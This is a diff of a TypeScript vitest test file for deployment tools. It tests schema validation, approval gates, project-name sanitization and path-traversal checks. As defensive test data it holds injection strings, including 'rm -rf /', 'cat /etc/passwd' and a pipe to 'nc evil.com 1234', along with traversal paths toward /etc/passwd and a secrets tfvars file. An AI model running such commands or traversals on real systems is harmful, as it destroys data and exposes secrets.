@@ -5,7 +5,6 @@
  * Focuses on security, validation, and error handling.
  */
 
-import { describe, it, expect, beforeEach, vi } from 'vitest';
 import * as path from 'path';
 
 // ─── Schema Validation Tests ─────────────────────────────────────────────────
@@ -23,26 +22,32 @@ describe('Deployment Schema Validation', () => {
       const input = {};
       const result = schemas.VercelDeploySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.directory).toBe('.');
-      expect(result.data?.production).toBe(false);
+      if (result.success) {
+        expect(result.data?.directory).toBe('.');
+        expect(result.data?.production).toBe(false);
+      }
     });
 
     it('accepts production deployment', () => {
       const input = { production: true, projectName: 'my-app' };
       const result = schemas.VercelDeploySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.production).toBe(true);
-      expect(result.data?.projectName).toBe('my-app');
+      if (result.success) {
+        expect(result.data?.production).toBe(true);
+        expect(result.data?.projectName).toBe('my-app');
+      }
     });
 
     it('accepts environment variables', () => {
       const input = { env: { NODE_ENV: 'production', API_KEY: 'secret' } };
       const result = schemas.VercelDeploySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.env).toEqual({
-        NODE_ENV: 'production',
-        API_KEY: 'secret',
-      });
+      if (result.success) {
+        expect(result.data?.env).toEqual({
+          NODE_ENV: 'production',
+          API_KEY: 'secret',
+        });
+      }
     });
   });
 
@@ -57,9 +62,11 @@ describe('Deployment Schema Validation', () => {
       const input = { bucketName: 'my-bucket-123' };
       const result = schemas.AWSS3DeploySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.bucketName).toBe('my-bucket-123');
-      expect(result.data?.region).toBe('us-east-1');
-      expect(result.data?.buildDir).toBe('dist');
+      if (result.success) {
+        expect(result.data?.bucketName).toBe('my-bucket-123');
+        expect(result.data?.region).toBe('us-east-1');
+        expect(result.data?.buildDir).toBe('dist');
+      }
     });
 
     it('accepts CloudFront distribution ID', () => {
@@ -77,16 +84,20 @@ describe('Deployment Schema Validation', () => {
       const input = {};
       const result = schemas.TerraformInitSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.directory).toBe('terraform');
-      expect(result.data?.upgrade).toBe(false);
+      if (result.success) {
+        expect(result.data?.directory).toBe('terraform');
+        expect(result.data?.upgrade).toBe(false);
+      }
     });
 
     it('accepts upgrade option', () => {
       const input = { upgrade: true, reconfigure: true };
       const result = schemas.TerraformInitSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.upgrade).toBe(true);
-      expect(result.data?.reconfigure).toBe(true);
+      if (result.success) {
+        expect(result.data?.upgrade).toBe(true);
+        expect(result.data?.reconfigure).toBe(true);
+      }
     });
   });
 
@@ -98,17 +109,21 @@ describe('Deployment Schema Validation', () => {
       };
       const result = schemas.TerraformPlanSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.vars).toEqual({
-        region: 'us-west-2',
-        environment: 'staging',
-      });
+      if (result.success) {
+        expect(result.data?.vars).toEqual({
+          region: 'us-west-2',
+          environment: 'staging',
+        });
+      }
     });
 
     it('accepts destroy plan', () => {
       const input = { destroy: true };
       const result = schemas.TerraformPlanSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.destroy).toBe(true);
+      if (result.success) {
+        expect(result.data?.destroy).toBe(true);
+      }
     });
   });
 
@@ -117,14 +132,18 @@ describe('Deployment Schema Validation', () => {
       const input = {};
       const result = schemas.TerraformApplySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.autoApprove).toBe(false);
+      if (result.success) {
+        expect(result.data?.autoApprove).toBe(false);
+      }
     });
 
     it('accepts plan file', () => {
       const input = { planFile: 'tfplan' };
       const result = schemas.TerraformApplySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.planFile).toBe('tfplan');
+      if (result.success) {
+        expect(result.data?.planFile).toBe('tfplan');
+      }
     });
   });
 
@@ -133,7 +152,9 @@ describe('Deployment Schema Validation', () => {
       const input = {};
       const result = schemas.TerraformDestroySchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.autoApprove).toBe(false);
+      if (result.success) {
+        expect(result.data?.autoApprove).toBe(false);
+      }
     });
   });
 
@@ -148,8 +169,10 @@ describe('Deployment Schema Validation', () => {
       const input = { provider: 'aws' };
       const result = schemas.GenerateInfrastructureSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.provider).toBe('aws');
-      expect(result.data?.type).toBe('static');
+      if (result.success) {
+        expect(result.data?.provider).toBe('aws');
+        expect(result.data?.type).toBe('static');
+      }
     });
 
     it('rejects invalid provider', () => {
@@ -164,7 +187,9 @@ describe('Deployment Schema Validation', () => {
         const input = { provider: 'aws', type };
         const result = schemas.GenerateInfrastructureSchema.safeParse(input);
         expect(result.success).toBe(true);
-        expect(result.data?.type).toBe(type);
+        if (result.success) {
+          expect(result.data?.type).toBe(type);
+        }
       }
     });
 
@@ -172,7 +197,9 @@ describe('Deployment Schema Validation', () => {
       const input = { provider: 'aws', domain: 'example.com' };
       const result = schemas.GenerateInfrastructureSchema.safeParse(input);
       expect(result.success).toBe(true);
-      expect(result.data?.domain).toBe('example.com');
+      if (result.success) {
+        expect(result.data?.domain).toBe('example.com');
+      }
     });
   });
 });
@@ -258,172 +285,90 @@ describe('Deployment Security', () => {
       }
     });
 
-    it('should validate AWS regions', () => {
-      const validRegions = [
-        'us-east-1',
-        'us-west-2',
-        'eu-west-1',
-        'ap-southeast-2',
-      ];
-
-      const invalidRegions = ['us_east_1', 'US-EAST-1', 'useast1', 'invalid'];
-
-      const isValidRegion = (region: string): boolean => {
-        return /^[a-z]{2}-[a-z]+-\d+$/.test(region);
+    it('should sanitize project names for CLI safety', () => {
+      const sanitizeProjectName = (name: string): string => {
+        // Only allow alphanumeric, hyphens, underscores
+        return name.replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 100);
       };
 
-      for (const region of validRegions) {
-        expect(isValidRegion(region)).toBe(true);
-      }
-
-      for (const region of invalidRegions) {
-        expect(isValidRegion(region)).toBe(false);
-      }
-    });
-
-    it('should validate CloudFront distribution IDs', () => {
-      const validIds = ['E1234567890ABC', 'EDFDVBD632BHDS5'];
-
-      const invalidIds = [
-        'e1234567890abc', // lowercase
-        'E123-456', // contains hyphen
-        '',
-      ];
-
-      const isValidDistributionId = (id: string): boolean => {
-        return /^[A-Z0-9]+$/.test(id);
-      };
-
-      for (const id of validIds) {
-        expect(isValidDistributionId(id)).toBe(true);
-      }
-
-      for (const id of invalidIds) {
-        expect(isValidDistributionId(id)).toBe(false);
-      }
-    });
-
-    it('should validate Terraform variable names', () => {
-      const validNames = [
-        'region',
-        'environment',
-        'my_var',
-        'var-name',
-        '_private',
-      ];
-
-      const invalidNames = [
-        '123var', // starts with number
-        '-var', // starts with hyphen
-        'var name', // contains space
-        'var;name', // contains semicolon
-      ];
-
-      const isValidVarName = (name: string): boolean => {
-        return /^[a-zA-Z_][a-zA-Z0-9_-]*$/.test(name);
-      };
-
-      for (const name of validNames) {
-        expect(isValidVarName(name)).toBe(true);
-      }
-
-      for (const name of invalidNames) {
-        expect(isValidVarName(name)).toBe(false);
-      }
-    });
-
-    it('should block dangerous Terraform variable values', () => {
-      const safeValues = ['production', 'us-east-1', '123', 'my-app-v2'];
-
-      const dangerousValues = [
-        '$(rm -rf /)',
-        'value; cat /etc/passwd',
-        'value | nc evil.com 1234',
-        'value`whoami`',
-        '${var.secret}', // prevent variable injection
-      ];
-
-      const isValidVarValue = (value: string): boolean => {
-        const dangerous = /[;&|`$(){}[\]<>\\!]/;
-        return !dangerous.test(value);
-      };
-
-      for (const value of safeValues) {
-        expect(isValidVarValue(value)).toBe(true);
-      }
-
-      for (const value of dangerousValues) {
-        expect(isValidVarValue(value)).toBe(false);
-      }
-    });
-
-    it('should validate Vercel project names', () => {
-      const validNames = ['my-app', 'project_123', 'MyProject'];
-
-      const invalidNames = [
-        'my app', // space
-        'project/test', // slash
-        'app<script>', // XSS attempt
-      ];
-
-      const isValidProjectName = (name: string): boolean => {
-        return /^[a-zA-Z0-9_-]+$/.test(name);
-      };
-
-      for (const name of validNames) {
-        expect(isValidProjectName(name)).toBe(true);
-      }
-
-      for (const name of invalidNames) {
-        expect(isValidProjectName(name)).toBe(false);
-      }
+      expect(sanitizeProjectName('my-project')).toBe('my-project');
+      expect(sanitizeProjectName('my_project_123')).toBe('my_project_123');
+      expect(sanitizeProjectName('test; rm -rf /')).toBe('test--rm--rf--');
+      expect(sanitizeProjectName('$(cat /etc/passwd)')).toBe(
+        '--cat--etc-passwd-'
+      );
     });
   });
 
-  describe('Sensitive Output Filtering', () => {
-    it('should filter sensitive patterns from Terraform output', () => {
-      const sensitivePatterns = [
-        /password\s*=\s*"[^"]+"/gi,
-        /secret\s*=\s*"[^"]+"/gi,
-        /api_key\s*=\s*"[^"]+"/gi,
-        /access_key\s*=\s*"[^"]+"/gi,
-        /private_key\s*=\s*"[^"]+"/gi,
-        /token\s*=\s*"[^"]+"/gi,
-      ];
+  describe('Terraform State Security', () => {
+    it('should not allow state file access outside workspace', () => {
+      const workspaceDir = '/workspace/project';
+      const stateFile = '../../../etc/passwd';
 
-      const testOutput = `
-        password = "super_secret_123"
-        api_key = "sk-1234567890abcdef"
-        region = "us-east-1"
-      `;
+      const resolvedPath = path.resolve(
+        workspaceDir,
+        stateFile.replace(/^[/\\]+/, '')
+      );
+      const isWithinWorkspace = resolvedPath.startsWith(workspaceDir);
 
-      let filtered = testOutput;
-      for (const pattern of sensitivePatterns) {
-        filtered = filtered.replace(pattern, '[REDACTED]');
-      }
+      expect(isWithinWorkspace).toBe(false);
+    });
 
-      expect(filtered).not.toContain('super_secret_123');
-      expect(filtered).not.toContain('sk-1234567890abcdef');
-      expect(filtered).toContain('region = "us-east-1"');
+    it('should block var-file traversal', () => {
+      const workspaceDir = '/workspace/project';
+      const varFile = '../../secrets/terraform.tfvars';
+
+      const resolvedPath = path.resolve(
+        workspaceDir,
+        varFile.replace(/^[/\\]+/, '')
+      );
+      const isWithinWorkspace = resolvedPath.startsWith(workspaceDir);
+
+      expect(isWithinWorkspace).toBe(false);
     });
   });
+});
 
-  describe('Approval Gates', () => {
-    it('terraform_apply should require approval without planFile', () => {
-      // The tool should refuse to apply without either:
-      // 1. A saved plan file
-      // 2. Explicit autoApprove=true
+// ─── Approval Flow Tests ─────────────────────────────────────────────────────
 
-      const input = { directory: 'terraform' };
-      // Without planFile and autoApprove=false, should require approval
-
+describe('Terraform Approval Flows', () => {
+  describe('Apply Approval', () => {
+    it('should require approval by default', () => {
+      const input: {
+        directory: string;
+        autoApprove?: boolean;
+        planFile?: string;
+      } = { directory: 'terraform' };
       const requiresApproval = !input.planFile && !input.autoApprove;
       expect(requiresApproval).toBe(true);
     });
 
-    it('terraform_destroy should always require explicit autoApprove', () => {
-      // Destroy is destructive - should never auto-approve
-      const input = { directory: 'terraform' };
+    it('should skip approval with planFile', () => {
+      const input: {
+        directory: string;
+        autoApprove?: boolean;
+        planFile?: string;
+      } = { directory: 'terraform', planFile: 'tfplan' };
+      const requiresApproval = !input.planFile && !input.autoApprove;
+      expect(requiresApproval).toBe(false);
+    });
+
+    it('should skip approval with autoApprove', () => {
+      const input: {
+        directory: string;
+        autoApprove?: boolean;
+        planFile?: string;
+      } = { directory: 'terraform', autoApprove: true };
+      const requiresApproval = !input.planFile && !input.autoApprove;
+      expect(requiresApproval).toBe(false);
+    });
+  });
+
+  describe('Destroy Approval', () => {
+    it('should always require approval without autoApprove', () => {
+      const input: { directory: string; autoApprove?: boolean } = {
+        directory: 'terraform',
+      };
       const requiresApproval = !input.autoApprove;
       expect(requiresApproval).toBe(true);
     });
@@ -464,7 +409,10 @@ describe('Infrastructure Generator', () => {
         },
       };
 
-      const deps = { ...mockPackageJson.dependencies };
+      const deps = { ...mockPackageJson.dependencies } as Record<
+        string,
+        string
+      >;
       const isReact = !!deps['react'] || !!deps['react-dom'];
       expect(isReact).toBe(true);
     });
@@ -477,7 +425,10 @@ describe('Infrastructure Generator', () => {
         },
       };
 
-      const deps = { ...mockPackageJson.dependencies };
+      const deps = { ...mockPackageJson.dependencies } as Record<
+        string,
+        string
+      >;
       const isNextjs = !!deps['next'];
       expect(isNextjs).toBe(true);
     });
@@ -489,7 +440,10 @@ describe('Infrastructure Generator', () => {
         },
       };
 
-      const deps = { ...mockPackageJson.dependencies };
+      const deps = { ...mockPackageJson.dependencies } as Record<
+        string,
+        string | undefined
+      >;
       const isApi = !!deps['express'] || !!deps['fastify'] || !!deps['koa'];
       expect(isApi).toBe(true);
     });
@@ -569,7 +523,7 @@ describe('Deployment Error Handling', () => {
 describe('Deployment Integration', () => {
   describe('Tool Definition Completeness', () => {
     it('should have all deployment tools defined', async () => {
-      const { TOOL_DEFINITIONS } = await import('../ToolExecutor');
+      const { TOOL_DEFINITIONS } = await import('../../tools/ToolExecutor');
 
       const deploymentTools = [
         'deploy_netlify',
@@ -583,7 +537,9 @@ describe('Deployment Integration', () => {
         'generate_infrastructure',
       ];
 
-      const definedTools = TOOL_DEFINITIONS.map((t: any) => t.name);
+      const definedTools = TOOL_DEFINITIONS.map(
+        (t: { name: string }) => t.name
+      );
 
       for (const tool of deploymentTools) {
         expect(definedTools).toContain(tool);
@@ -593,7 +549,7 @@ describe('Deployment Integration', () => {
 
   describe('Schema Map Completeness', () => {
     it('should have schemas for all deployment tools', async () => {
-      const schemas = await import('../schemas');
+      const schemas = await import('../../tools/schemas');
 
       expect(schemas.VercelDeploySchema).toBeDefined();
       expect(schemas.AWSS3DeploySchema).toBeDefined();
